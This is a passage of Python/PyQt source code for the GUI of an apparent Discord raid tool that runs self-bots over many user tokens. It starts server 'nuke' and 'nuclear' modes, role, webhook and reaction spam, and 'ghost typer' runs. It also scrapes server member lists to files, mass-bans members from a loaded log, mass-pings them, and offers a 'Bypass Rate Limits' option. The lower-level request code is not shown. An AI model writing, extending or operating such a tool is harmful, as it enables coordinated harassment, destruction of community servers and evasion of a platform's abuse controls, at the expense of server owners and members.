            image_data=images_data,
            message_sender_func=self.send_macro_message,
            initiating_button=self.start_macro_btn
        )

        macro_bot.update_signal.connect(self.log)
        macro_bot.finished_signal.connect(self.on_bot_finished)
        
        self.running_bots.append(macro_bot)
        self.set_stop_button_enabled.emit(True)
        macro_bot.start()



    def run_macro(self):
        """Runs a message macro, sending a message at a regular interval."""
        if not self.running: return

        # Get options from the bot's attributes, set by start_bot
        channel_id = getattr(self, 'macro_channel_id', None)
        messages = getattr(self, 'macro_messages', [])
        use_random = getattr(self, 'macro_use_random', True)
        delay = getattr(self, 'macro_delay', 5.0)
        image_data = getattr(self, 'macro_image_data', [])
        
        self.update_signal.emit(f"[▶️] Macro started. Sending to channel {channel_id} every {delay}s.")

        while self.running:
            message_to_send = ""
            if messages:
                if use_random:
                    message_to_send = random.choice(messages)
                else:
                    message_to_send = '\n'.join(messages)

            success = self.send_macro_message(self.get_next_token(), channel_id, message_to_send, image_data)
            if not success:
                self.update_signal.emit(f"  -> Macro stopping due to send failure.")
                break

            # Interruptible sleep loop
            end_time = time.time() + delay
            while self.running and time.time() < end_time:
                time.sleep(0.1)

    def create_command_editor_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        command_def_group = QGroupBox("Command Editor")
        command_def_group.setStyleSheet("QGroupBox { color: white; }")
        command_def_layout = QVBoxLayout(command_def_group)

        top_button_layout = QHBoxLayout()
        top_button_layout.addStretch()
        self.new_command_btn = MinimalButton("New Command")
        self.new_command_btn.clicked.connect(self.clear_command_editor)
        top_button_layout.addWidget(self.new_command_btn)
        command_def_layout.addLayout(top_button_layout)

        name_aliases_layout = QHBoxLayout()
        cmd_name_label = QLabel("Command Name & Aliases (comma-separated):")
        cmd_name_label.setStyleSheet("color: white; font-size: 11px;")
        self.cmd_name_input = ModernLineEdit()
        self.cmd_name_input.setPlaceholderText("!s/[!your command] if text black you executed.")
        name_aliases_layout.addWidget(cmd_name_label)
        name_aliases_layout.addWidget(self.cmd_name_input)
        command_def_layout.addLayout(name_aliases_layout)

        actions_label = QLabel("Actions:")
        actions_label.setStyleSheet("color: white; font-size: 11px;")
        command_def_layout.addWidget(actions_label)
        self.command_actions_list = QTextEdit()
        self.command_actions_list.setReadOnly(True)
        self.command_actions_list.setFixedHeight(120)
        self.command_actions_list.setStyleSheet(
            "background: rgba(16, 20, 28, 0.6); border: 1px solid rgba(74, 85, 104, 0.4); border-radius: 8px; color: white; padding: 5px; font-size: 10px;")
        command_def_layout.addWidget(self.command_actions_list)

        action_controls_layout = QHBoxLayout()
        self.add_action_button = MinimalButton("Add Action")
        self.add_action_button.clicked.connect(self.show_action_picker)
        action_controls_layout.addWidget(self.add_action_button)
        self.remove_last_action_button = MinimalButton("Remove Last")
        self.remove_last_action_button.clicked.connect(self.remove_last_action)
        action_controls_layout.addWidget(self.remove_last_action_button)
        command_def_layout.addLayout(action_controls_layout)

        duration_layout = QHBoxLayout()
        duration_label = QLabel("Execution Mode:")
        duration_label.setToolTip(
            "Until Done: Runs actions one by one, waiting for each to finish.\nUntil Stopped: Runs all actions at once and they run forever until you press STOP.")
        duration_label.setStyleSheet("color: white; font-size: 11px;")
        self.duration_type_combo = QComboBox()
        self.duration_type_combo.addItems(["Until Done", "Until Stopped", "Fixed Seconds"])
        self.duration_type_combo.setStyleSheet("""
            QComboBox { background: rgba(26, 32, 44, 0.6); border: 1.5px solid rgba(74, 85, 104, 0.4); border-radius: 8px; color: white; padding: 5px 15px 5px 10px; selection-background-color: rgba(99, 179, 237, 0.3); font-size: 11px; }
            QComboBox::drop-down { border: 0px; } QComboBox::down-arrow { width: 12px; height: 12px; }
            QComboBox::on { border: 1.5px solid rgba(99, 179, 237, 0.8); }
            QComboBox QAbstractItemView { background: rgba(26, 32, 44, 0.9); border: 1px solid rgba(99, 179, 237, 0.8); selection-background-color: rgba(99, 179, 237, 0.3); color: white; }
        """)
        self.duration_value_input = QSpinBox()
        self.duration_value_input.setRange(1, 9999)
        self.duration_value_input.setValue(10)
        self.duration_value_input.setSuffix("s")
        self.duration_value_input.setStyleSheet(
            "QSpinBox { background: rgba(26, 32, 44, 0.6); border: 1.5px solid rgba(74, 85, 104, 0.4); border-radius: 8px; color: white; padding: 5px 10px; font-size: 11px; } QSpinBox::up-button, QSpinBox::down-button { width: 20px; border: none; background: transparent; } QSpinBox::up-arrow, QSpinBox::down-arrow { width: 10px; height: 10px; }")
        self.duration_type_combo.currentIndexChanged.connect(lambda index: self.duration_value_input.setVisible(
            self.duration_type_combo.currentText() == "Fixed Seconds"))
        self.duration_value_input.setVisible(False)
        duration_layout.addWidget(duration_label)
        duration_layout.addWidget(self.duration_type_combo)
        duration_layout.addWidget(self.duration_value_input)
        command_def_layout.addLayout(duration_layout)

        self.save_command_button = MinimalButton("Save Command")
        self.save_command_button.clicked.connect(self.save_or_update_command)
        command_def_layout.addWidget(self.save_command_button)

        layout.addWidget(command_def_group)
        layout.addStretch()
        return widget


    def update_existing_commands_list(self):
        self.existing_commands_list_widget.clear()
        for cmd in self.custom_commands:
            list_item_widget = QWidget()

            # The setMinimumHeight line has been REMOVED from here.

            item_layout = QHBoxLayout(list_item_widget)
            item_layout.setContentsMargins(5, 5, 5, 5)
            item_layout.setSpacing(10)

            chk_box = AnimatedCheckBox("")
            chk_box.setChecked(cmd.enabled)
            chk_box.toggled.connect(lambda state, c=cmd: self.toggle_command_enabled(c, state))
            # The alignment flag here will now work correctly because the checkbox has a fixed height.
            item_layout.addWidget(chk_box, 0, Qt.AlignmentFlag.AlignVCenter) 

            cmd_text = f"<b>{cmd.name}</b>"
            if cmd.aliases:
                cmd_text += f" <i style='color:#A0AEC0;'>({', '.join(cmd.aliases)})</i>"
            cmd_text += f"<br/><span style='color:#A0AEC0; font-size:9px;'>{len(cmd.actions)} Action(s)</span>"
            label = QLabel(cmd_text)
            label.setWordWrap(True)
            label.setTextFormat(Qt.TextFormat.RichText)
            label.setStyleSheet("color: white; background: transparent;")
            item_layout.addWidget(label, 1)

            item = QListWidgetItem(self.existing_commands_list_widget)
            item.setData(Qt.ItemDataRole.UserRole, cmd)
            
            item.setSizeHint(list_item_widget.sizeHint())
            
            self.existing_commands_list_widget.setItemWidget(item, list_item_widget)



    def create_command_listener_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        listener_group = QGroupBox("Command Listener")
        listener_group.setStyleSheet("QGroupBox { color: white; }")
        listener_layout = QVBoxLayout(listener_group)  # Changed to QVBoxLayout

        button_layout = QHBoxLayout()
        self.start_listener_button = MinimalButton("START LISTENER")
        self.start_listener_button.clicked.connect(self.start_command_listener)
        button_layout.addWidget(self.start_listener_button)

        self.stop_listener_button = MinimalButton("STOP LISTENER")
        self.stop_listener_button.clicked.connect(self.stop_command_listener)
        self.stop_listener_button.setEnabled(False)
        button_layout.addWidget(self.stop_listener_button)
        listener_layout.addLayout(button_layout)

        # New "Execute with all tokens" checkbox
        self.command_execute_all_tokens_check = AnimatedCheckBox("Execute Commands With All Tokens")
        self.command_execute_all_tokens_check.setToolTip(
            "If checked, all loaded tokens will execute the command simultaneously.")
        listener_layout.addWidget(self.command_execute_all_tokens_check)

        layout.addWidget(listener_group)

        cmd_logs_label = QLabel("Command Logs:")
        cmd_logs_label.setStyleSheet("color: white; font-size: 11px;")
        layout.addWidget(cmd_logs_label)
        self.command_logs = ModernTextEdit()
        self.command_logs.setReadOnly(True)
        layout.addWidget(self.command_logs)

        return widget

    def update_turbo_delay_label(self, value):
        self.turbo_delay_value_label.setText(str(value))

    def update_nuclear_msg_count_label(self, value):
        self.nuclear_msg_count_value_label.setText(str(value))

    def switch_sub_tab(self, stacked_widget: QStackedWidget, new_index: int):
        current_index = stacked_widget.currentIndex()
        if current_index == new_index: return


        if self.performance_mode_check and self.performance_mode_check.isChecked():
            stacked_widget.setCurrentIndex(new_index)
            return # Skip the animation entirely


        current_widget = stacked_widget.widget(current_index)
        next_widget = stacked_widget.widget(new_index)
        direction = 1 if new_index > current_index else -1

        next_widget.show()
        next_widget.setGeometry(0, 0, stacked_widget.width(), stacked_widget.height())
        next_widget.move(direction * stacked_widget.width(), 0)

        anim_current = QPropertyAnimation(current_widget, b"pos", self)
        anim_current.setDuration(250)
        anim_current.setEasingCurve(QEasingCurve.Type.OutCubic)
        anim_current.setStartValue(QPoint(0, 0))
        anim_current.setEndValue(QPoint(-direction * stacked_widget.width(), 0))
        anim_current.finished.connect(current_widget.hide)

        anim_next = QPropertyAnimation(next_widget, b"pos", self)
        anim_next.setDuration(250)
        anim_next.setEasingCurve(QEasingCurve.Type.OutCubic)
        anim_next.setStartValue(QPoint(direction * stacked_widget.width(), 0))
        anim_next.setEndValue(QPoint(0, 0))

        stacked_widget.setCurrentIndex(new_index)
        anim_current.start()
        anim_next.start()


    def create_command_list_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        existing_commands_group = QGroupBox("Command List (Double-click to edit)")
        existing_commands_group.setStyleSheet("QGroupBox { color: white; }")
        existing_commands_layout = QVBoxLayout(existing_commands_group)

        self.existing_commands_list_widget = QListWidget()
        self.existing_commands_list_widget.itemDoubleClicked.connect(self.edit_selected_command)
        self.existing_commands_list_widget.setStyleSheet("""
            QListWidget { 
                background: rgba(26, 32, 44, 0.6); 
                border: 1.5px solid rgba(74, 85, 104, 0.4); 
                border-radius: 12px; color: white; 
                padding: 5px; 
                selection-background-color: rgba(99, 179, 237, 0.3); 
            }
            QListWidget::item { 
                padding: 1px; 
            }
            QListWidget::item:selected { 
                background: rgba(99, 179, 237, 0.5); 
                border: 1px solid rgba(99, 179, 237, 0.8); 
                border-radius: 6px; 
            }
        """)
        existing_commands_layout.addWidget(self.existing_commands_list_widget)

        cmd_actions_layout = QHBoxLayout()
        self.save_commands_button = MinimalButton("Save List To File")
        self.save_commands_button.clicked.connect(self.save_commands)
        cmd_actions_layout.addWidget(self.save_commands_button)
        self.load_commands_button = MinimalButton("Load List From File")
        self.load_commands_button.clicked.connect(self.load_commands)
        cmd_actions_layout.addWidget(self.load_commands_button)
        self.remove_selected_command_button = MinimalButton("Remove Selected")
        self.remove_selected_command_button.clicked.connect(self.remove_selected_command)
        cmd_actions_layout.addWidget(self.remove_selected_command_button)
        existing_commands_layout.addLayout(cmd_actions_layout)

        layout.addWidget(existing_commands_group)
        return widget
    
    def create_simple_content_widget(self, text: str):
        widget = QWidget(self)
        widget.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        widget.setStyleSheet("background: transparent;")
        layout = QVBoxLayout(widget)
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.setContentsMargins(50, 50, 50, 50)
        label = QLabel(text, widget)
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        label.setStyleSheet("color: white; font-size: 20px; font-weight: bold; background: transparent;")
        layout.addWidget(label)
        layout.addStretch()
        return widget

    def handle_star_color_changed(self, color: QColor, index: int):
        if self.animated_background:
            self.animated_background.update_star_color(index, color)
        self.log(f"Star Group {index + 1} color changed to: {color.getRgb()}")

    def handle_text_color_changed(self, color: QColor, element: str):
        self.log(f"{element} color changed to: {color.getRgb()}")



    def create_settings_widget(self):
        # --- Outer Container (Transparent) ---
        outer_container = QWidget(self)
        outer_container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        outer_layout = QVBoxLayout(outer_container)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        # --- Scroll Area (To prevent cutting off content) ---
        scroll_area = QScrollArea(outer_container)
        scroll_area.setWidgetResizable(True)
        scroll_area.setFrameShape(QFrame.Shape.NoFrame)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        
        scroll_area.setStyleSheet("""
            QScrollArea { background: transparent; }
            QScrollBar:vertical {
                border: none; background: rgba(0, 0, 0, 0.2); width: 8px; margin: 0px; border-radius: 4px;
            }
            QScrollBar::handle:vertical {
                background: rgba(255, 255, 255, 0.2); min-height: 20px; border-radius: 4px;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0px; }
        """)

        # --- The "Glass" Panel (Scroll Content) ---
        panel = QFrame()
        panel.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        panel.setStyleSheet("""
            QFrame { 
                background: rgba(26, 32, 44, 0.7); 
                border-radius: 15px; 
            }
        """)
        panel.setFixedWidth(550) 
        
        layout = QVBoxLayout(panel)
        layout.setContentsMargins(40, 30, 40, 30)
        layout.setSpacing(20)
        layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        # --- Header Title ---
        title = QLabel("Application Settings", panel)
        title.setStyleSheet("color: white; font-size: 22px; font-weight: bold; background: transparent;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addWidget(title)
        
        # Separator
        sep1 = QFrame()
        sep1.setFrameShape(QFrame.Shape.HLine)
        sep1.setStyleSheet("background: transparent; border-top: 1px solid rgba(255, 255, 255, 0.15);")
        layout.addWidget(sep1)

        # ==========================================
        # SECTION 1: Star Appearance
        # ==========================================
        star_title = QLabel("Star Appearance", panel)
        star_title.setStyleSheet("color: #A0AEC0; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; background: transparent;")
        layout.addWidget(star_title)

        star_colors_layout = QGridLayout()
        star_colors_layout.setSpacing(15)

        self.star_color_pickers = []
        initial_star_colors = self.animated_background.star_colors if self.animated_background else [QColor(255, 255, 255)] * 4
        for i in range(4):
            color_picker = ColorPicker(f"Star Group {i + 1}", self.window(), panel)
            color_picker.current_color = initial_star_colors[i]
            color_picker.update_color_preview()
            color_picker.colorChanged.connect(lambda color, idx=i: self.handle_star_color_changed(color, idx))
            self.star_color_pickers.append(color_picker)
            star_colors_layout.addWidget(color_picker, i // 2, i % 2)
        layout.addLayout(star_colors_layout)

        # Separator
        sep2 = QFrame()
        sep2.setFrameShape(QFrame.Shape.HLine)
        sep2.setStyleSheet("background: transparent; border-top: 1px solid rgba(255, 255, 255, 0.15);")
        layout.addWidget(sep2)





# ==========================================
        # SECTION 2: Thread Configuration
        # ==========================================
        thread_title = QLabel("Thread Configuration", panel)
        thread_title.setStyleSheet("color: #A0AEC0; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; background: transparent;")
        layout.addWidget(thread_title)

        thread_layout = QGridLayout()
        thread_layout.setHorizontalSpacing(20)
        thread_layout.setVerticalSpacing(10)

        # High Threads
        self.high_thread_count_check = AnimatedCheckBox("Legacy High Threads (500)")
        self.high_thread_count_check.setToolTip("Uses 500 threads. Maximum speed but may lag GUI.")
        thread_layout.addWidget(self.high_thread_count_check, 0, 0)

        # Low Threads
        self.low_thread_count_check = AnimatedCheckBox("Potato Mode (Low Threads)")
        self.low_thread_count_check.setToolTip("Uses ~12 threads. Recommended for older PCs or if lagging.")
        thread_layout.addWidget(self.low_thread_count_check, 0, 1)

        # Single Thread
        self.single_thread_mode_check = AnimatedCheckBox("Single Thread Mode (1)")
        self.single_thread_mode_check.setToolTip("Uses only 1 thread. Extremely slow but very safe/stable.")
        thread_layout.addWidget(self.single_thread_mode_check, 1, 0)

        # --- NEW: Custom Threads ---
        self.custom_threads_check = AnimatedCheckBox("Custom Amount")
        self.custom_threads_check.setToolTip("Set a specific number of threads.")
        
        self.custom_threads_input = QSpinBox()
        self.custom_threads_input.setRange(1, 5000)
        self.custom_threads_input.setValue(100)
        self.custom_threads_input.setSuffix(" threads")
        self.custom_threads_input.setVisible(False) # Hidden by default
        self.custom_threads_input.setStyleSheet("""
            QSpinBox { 
                background: rgba(26, 32, 44, 0.6); 
                border: 1.5px solid rgba(74, 85, 104, 0.4); 
                border-radius: 6px; color: white; padding: 4px 10px; 
            }
        """)

        # Custom Thread Layout Container
        custom_thread_container = QWidget()
        custom_thread_layout = QHBoxLayout(custom_thread_container)
        custom_thread_layout.setContentsMargins(0, 0, 0, 0)
        custom_thread_layout.addWidget(self.custom_threads_check)
        custom_thread_layout.addWidget(self.custom_threads_input)
        
        thread_layout.addWidget(custom_thread_container, 1, 1)

        # --- Mutual Exclusion Logic ---
        def uncheck_others(checked_widget):
            if not checked_widget.isChecked(): return
            checks = [self.high_thread_count_check, self.low_thread_count_check, 
                      self.single_thread_mode_check, self.custom_threads_check]
            for check in checks:
                if check != checked_widget:
                    check.setChecked(False)

        self.high_thread_count_check.toggled.connect(lambda: uncheck_others(self.high_thread_count_check))
        self.low_thread_count_check.toggled.connect(lambda: uncheck_others(self.low_thread_count_check))
        self.single_thread_mode_check.toggled.connect(lambda: uncheck_others(self.single_thread_mode_check))
        
        # Custom logic: Show/Hide spinbox and uncheck others
        def toggle_custom(checked):
            self.custom_threads_input.setVisible(checked)
            uncheck_others(self.custom_threads_check)

        self.custom_threads_check.toggled.connect(toggle_custom)

        layout.addLayout(thread_layout)



        # Separator
        sep3 = QFrame()
        sep3.setFrameShape(QFrame.Shape.HLine)
        sep3.setStyleSheet("background: transparent; border-top: 1px solid rgba(255, 255, 255, 0.15);")
        layout.addWidget(sep3)

        # ==========================================
        # SECTION 3: General & Network
        # ==========================================
        gen_title = QLabel("General & Network", panel)
        gen_title.setStyleSheet("color: #A0AEC0; font-size: 13px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; background: transparent;")
        layout.addWidget(gen_title)

        gen_layout = QGridLayout()
        gen_layout.setHorizontalSpacing(20)
        gen_layout.setVerticalSpacing(15)

        # 1. Performance Mode
        self.performance_mode_check = AnimatedCheckBox("Performance Mode")
        self.performance_mode_check.setToolTip("Disables background animations and transitions to save CPU.")
        self.performance_mode_check.toggled.connect(self.toggle_performance_mode)
        gen_layout.addWidget(self.performance_mode_check, 0, 0)

        # 2. Bypass Rate Limits
        self.bypass_rate_limits_check = AnimatedCheckBox("Bypass Rate Limits (Risky)")
        self.bypass_rate_limits_check.setToolTip("Minimizes delays. Increases speed but high risk of timeouts.")
        gen_layout.addWidget(self.bypass_rate_limits_check, 0, 1)

        # 3. Clear Cache
        self.clear_cache_on_exit_check = AnimatedCheckBox("Clear Cache on Exit")
        self.clear_cache_on_exit_check.setToolTip("Wipes browser profile (Vencord/Login) on close.")
        gen_layout.addWidget(self.clear_cache_on_exit_check, 1, 0)

        # 4. Dead Tokens
        self.invalidate_tokens_check = AnimatedCheckBox("Cooldown Dead Tokens")
        self.invalidate_tokens_check.setChecked(True)
        self.invalidate_tokens_check.setToolTip("Temporarily stop using tokens that return 401/403 errors.")
        gen_layout.addWidget(self.invalidate_tokens_check, 1, 1)

        # 5. Lock Window Size (NEW)
        self.lock_window_size_check = AnimatedCheckBox("Lock Window Size (Discord)")
        self.lock_window_size_check.setToolTip("Prevents the window from expanding when opening the Discord tab.\n(MAY CAUSE ISSUES with web view visibility)")
        gen_layout.addWidget(self.lock_window_size_check, 2, 0)

        layout.addLayout(gen_layout)

        # --- Conditional Widget: Dead Token Retry Delay ---
        self.dead_token_retry_widget = QWidget()
        retry_layout = QHBoxLayout(self.dead_token_retry_widget)
        retry_layout.setContentsMargins(5, 0, 0, 0)
        
        retry_label = QLabel("Token Cooldown Time (s):")
        retry_label.setStyleSheet("color: white; font-size: 12px; background: transparent;")
        
        self.dead_token_retry_input = QSpinBox()
        self.dead_token_retry_input.setRange(1, 3600)
        self.dead_token_retry_input.setValue(30)
        self.dead_token_retry_input.setSuffix("s")
        self.dead_token_retry_input.setFixedWidth(100)
        self.dead_token_retry_input.setStyleSheet("""
            QSpinBox { 
                background: rgba(26, 32, 44, 0.6); 
                border: 1.5px solid rgba(74, 85, 104, 0.4); 
                border-radius: 6px; color: white; padding: 5px 10px; 
            }
        """)

        retry_layout.addWidget(retry_label)
        retry_layout.addWidget(self.dead_token_retry_input)
        retry_layout.addStretch()
        
        layout.addWidget(self.dead_token_retry_widget)
        
        # Show/Hide retry logic
        self.invalidate_tokens_check.toggled.connect(self.dead_token_retry_widget.setVisible)
        self.dead_token_retry_widget.setVisible(self.invalidate_tokens_check.isChecked())

        layout.addStretch() # Push everything to top

        # Set panel as widget
        scroll_area.setWidget(panel)
        outer_layout.addWidget(scroll_area)

        return outer_container



    
    def log(self, message):
        current_time = datetime.now().strftime('%H:%M:%S')
        log_message = f"[{current_time}] {message}"

        active_bot_types = {type(b) for b in self.running_bots}

        if self.command_listener_bot and self.command_listener_bot.isRunning():
            self.command_gui_log(message)
            return

        if CommandActionListener in active_bot_types:
            self.command_gui_log(log_message)
        elif ServerClonerBot in active_bot_types:
            self.cloner_log(log_message)
        elif any(
                b.current_mode in ["member_logger", "ban_from_log", "ping_all", "ban_all_server", "ping_all_server",
                                   "super_scan_members"] for
                b in self.running_bots if
                isinstance(b, MidnightClientSelfBot)):
            self.member_log(log_message)
        elif hasattr(self, 'logs') and self.logs:
            self.logs.append(log_message)
        else:
            print(f"[PRE-GUI LOG]: {message}")

    def start_nuke(self):
        """
        Handles the click of the 'NUKE SERVER' button with bot-aware safety checks.
        """
        # 1. Validate Server ID immediately
        if not self.get_valid_server_id():
            self.log("[❌] Nuke cancelled: Invalid Server ID.")
            return

        self.log(f"[DEBUG] Nuke initiated. Bot mode flag is: {self.is_bot_mode}")
        
        # 2. Ban All Safety Check
        if self.ban_all_check.isChecked() and not self.loaded_member_ids and not self.is_bot_mode:
            CustomMessageBox.warning(self, "Safety Check",
                                "The 'Ban All Members' option is enabled, but no member log has been loaded.\n\n"
                                "Please load a member log file from the 'Members' tab first, or disable the 'Ban All' option to proceed.")
            self.log("[⚠️] Nuke cancelled: 'Ban All' is enabled but no member log is loaded for user-token mode.")
            return
        
        # 3. Confirmation
        if not self.confirm_action("nuke"):
            return

        self.start_bot("nuke", initiating_button=self.sender())





    def start_ghost_typer(self):
        if not self.tokens:
            self.log("[❌] No tokens loaded.")
            return

        channel_id = self.channel_id_input.text().strip()

        # --- FIX: Validate Channel ID ---
        if not channel_id or not channel_id.isdigit():
            self.log("[❌] Ghost Typer Error: Valid Numeric Channel ID is required.")
            CustomMessageBox.warning(self, "Input Error", "Please enter a valid numeric Channel ID.")
            return
        # --------------------------------

        self.log(f"[👻] Starting Ghost Typer for {len(self.tokens)} token(s)...")
        
        # We pass the button so it disables/enables correctly
        self.start_bot("ghost_typer", initiating_button=self.start_ghost_typer_btn)

        ghost_bot = GhostTyperBot(
            tokens=self.tokens,
            channel_id=channel_id,
            initiating_button=self.start_ghost_typer_btn
        )
        ghost_bot.update_signal.connect(self.log)
        ghost_bot.finished.connect(self.on_bot_finished)
        self.running_bots.append(ghost_bot)
        self.set_stop_button_enabled.emit(True)
        ghost_bot.start()





    def start_spam_mode(self, mode):
        """
        Handles starting various spam modes (nuclear, turbo, roles, webhooks).
        """
        # 1. Validate Server ID for modes that require it
        server_id = self.get_valid_server_id()
        
        server_modes = ["nuke", "nuclear", "turbo", "role_spammer", "webhook_spammer", 
                        "webhook_spam_existing", "webhook_create_only"]
        
        if mode in server_modes and not server_id:
            self.log(f"[❌] {mode.replace('_', ' ').title()} requires a valid Server ID!")
            return

        channel_id = self.channel_id_input.text().strip()

        # 2. Validate Channel ID for Turbo
        if mode == "turbo" and not channel_id:
            self.log("[❌] Channel ID is required for Turbo Mode!")
            CustomMessageBox.warning(self, "Input Error", "Turbo Mode requires a Channel ID.")
            return

        # 3. Validate Reaction Spammer Inputs
        if mode == "reaction_spammer" and (
                not self.reaction_channel_id_input.text().strip() or not self.reaction_message_id_input.text().strip()):
            self.log("[❌] Channel and Message ID are required for Reaction Spammer!")
            CustomMessageBox.warning(self, "Input Error", "Reaction Spammer requires both Channel ID and Message ID.")
            return

        # 4. Validate Single Webhook Target
        if mode in ["webhook_spammer", "webhook_create_only"] and \
           self.webhook_single_channel_check.isChecked() and \
           not self.webhook_target_channel_id_input.text().strip():
            self.log("[❌] Target Channel ID is required for single channel webhook mode!")
            CustomMessageBox.warning(self, "Input Error", "Please enter a target Channel ID.")
            return

        if not self.confirm_action(mode): 
            return
            
        self.start_bot(mode, initiating_button=self.sender())



    def start_ghost_typer(self):
        if not self.tokens:
            self.log("[❌] No tokens loaded.")
            return
        channel_id = self.channel_id_input.text().strip()
        if not channel_id:
            self.log("[❌] Ghost Typer Error: Channel ID is required.")
            return
        self.log(f"[👻] Starting Ghost Typer for {len(self.tokens)} token(s)...")
        self.start_bot("ghost_typer", initiating_button=self.start_ghost_typer_btn)

        ghost_bot = GhostTyperBot(
            tokens=self.tokens,  # Pass the entire list of tokens
            channel_id=channel_id,
            initiating_button=self.start_ghost_typer_btn
        )
        ghost_bot.update_signal.connect(self.log)
        ghost_bot.finished.connect(self.on_bot_finished)
        self.running_bots.append(ghost_bot)
        self.set_stop_button_enabled.emit(True)
        ghost_bot.start()


    def start_status_changer(self):
        if not self.tokens:
            self.log("[❌] No tokens loaded.")
            return

        # --- FIX: Validate Optional Emoji Server ID ---
        emoji_server_text = self.status_emoji_server_id_input.text().strip()
        if emoji_server_text:
            # Try to resolve if it's a name in cache, otherwise check digit
            if emoji_server_text in self.server_name_cache:
                # Auto-fix the input box to show the ID so the options gatherer picks it up correctly
                resolved_id = str(self.server_name_cache[emoji_server_text]['id'])
                self.status_emoji_server_id_input.setText(resolved_id)
            elif not emoji_server_text.isdigit():
                self.log("[❌] Invalid Emoji Server ID. Must be numeric.")
                CustomMessageBox.warning(self, "Input Error", "The Emoji Server ID must be a numeric ID.")
                return
        # ----------------------------------------------

        is_text_mode = bool([line.strip() for line in self.status_text_input.toPlainText().split('\n') if line.strip()])
        is_presence_mode = self.status_cycle_presence_check.isChecked() and any(
            cb.isChecked() for cb in self.status_presence_group.findChildren(QCheckBox) if
            cb != self.status_cycle_presence_check)

        if not is_text_mode and not is_presence_mode:
            self.log("[❌] No status texts or presence options are configured. Nothing to do.")
            CustomMessageBox.warning(self, "Configuration Error",
                                "Please either enter text for the custom status or enable and select at least one presence status (Online, Idle, DND).")
            return

        self.log("[🚀] Activating status changer...")
        self.start_bot("status_changer", initiating_button=self.sender())



    def start_member_logger(self):
        # FIX: Use the validator
        server_id = self.get_valid_server_id()
        if not server_id:
            return
        
        # New Custom Popup
        dialog = MemberScanConfigDialog(self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            limit = dialog.get_limit()
            self.member_log(f"[▶️] Starting member fetch for server: {server_id} (Limit: {'Auto' if limit==0 else limit})")
            
            options = self.get_current_bot_options()
            options['custom_member_limit'] = limit
            self.start_bot("member_logger", initiating_button=self.sender(), command_options=options)




    def start_super_scan_members(self):
        # --- FIX: Use the validator ---
        server_id = self.get_valid_server_id()
        if not server_id:
            return # Error message handled by validator

        # Show Custom Popup
        dialog = MemberScanConfigDialog(self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            limit = dialog.get_limit()
            
            self.member_log(f"[▶️] Starting SUPER SCAN for server: {server_id}")
            
            options = self.get_current_bot_options()
            options['custom_member_limit'] = limit

            self.start_bot("super_scan_members", initiating_button=self.sender(), command_options=options)





    def on_members_fetched(self, members):
        if not members:
            self.member_log("[❌] Member fetch failed or returned no members.")
            return

        # Deduplicate list based on ID
        unique_members = {m['id']: m for m in members}.values()
        count = len(unique_members)

        self.member_log(f"[✅] Successfully fetched {count} unique members.")
        
        # --- FIX: Use valid ID for filename if available, else 'server' ---
        server_id = self.get_valid_server_id() or "server"
        default_name = f"members_{server_id}.txt"
        
        path, _ = QFileDialog.getSaveFileName(self, "Save Member Log", default_name, "Text Files (*.txt)")

        if path:
            try:
                written_ids = set()
                with open(path, 'w', encoding='utf-8') as f:
                    for member in unique_members:
                        uid = member['id']
                        username = member['username']
                        
                        if uid not in written_ids:
                            f.write(f"{uid} - {username}\n")
                            written_ids.add(uid)
                            
                self.member_log(f"[✅] Saved {len(written_ids)} unique members to: {path}")
            except Exception as e:
                self.member_log(f"[❌] Failed to save member log: {e}")
        else:
            self.member_log("[🛑] Save operation cancelled by user.")

        if self.fetch_log_btn: self.fetch_log_btn.setEnabled(True)
        if self.super_scan_btn: self.super_scan_btn.setEnabled(True)
        self.set_stop_button_enabled.emit(bool(self.running_bots))



    def load_member_log(self):
        path, _ = QFileDialog.getOpenFileName(self, "Load Member Log", "", "Text Files (*.txt)")
        if path:
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                self.loaded_member_ids = [re.match(r'^(\d+)', line.strip()).group(1) for line in lines if
                                          re.match(r'^(\d+)', line.strip())]

                if not self.loaded_member_ids:
                    self.member_log("[❌] No valid User IDs found in the selected file.")
                    self.member_status_label.setText("Status: Idle")
                    self.ban_from_log_btn.setEnabled(False)
                    self.ping_all_batch_btn.setEnabled(False)
                    self.ping_all_spam_btn.setEnabled(False)
                    return

                self.pinged_member_ids.clear()
                self.member_status_label.setText(f"Status: Loaded {len(self.loaded_member_ids)} IDs. Ready.")
                self.member_log(f"[✅] Loaded {len(self.loaded_member_ids)} user IDs from {os.path.basename(path)}.")
                self.ban_from_log_btn.setEnabled(True)
                self.ping_all_batch_btn.setEnabled(True)
                self.ping_all_spam_btn.setEnabled(True)

            except Exception as e:
                self.member_log(f"[❌] Failed to load or parse log file: {e}")
                self.loaded_member_ids = []
                self.member_status_label.setText("Status: Idle")
                self.ban_from_log_btn.setEnabled(False)
                self.ping_all_batch_btn.setEnabled(False)
                self.ping_all_spam_btn.setEnabled(False)

    def start_ban_from_log(self):
        # --- FIX: Use the validator ---
        server_id = self.get_valid_server_id()
        if not server_id:
            return # Error message handled by validator

        if not self.loaded_member_ids:
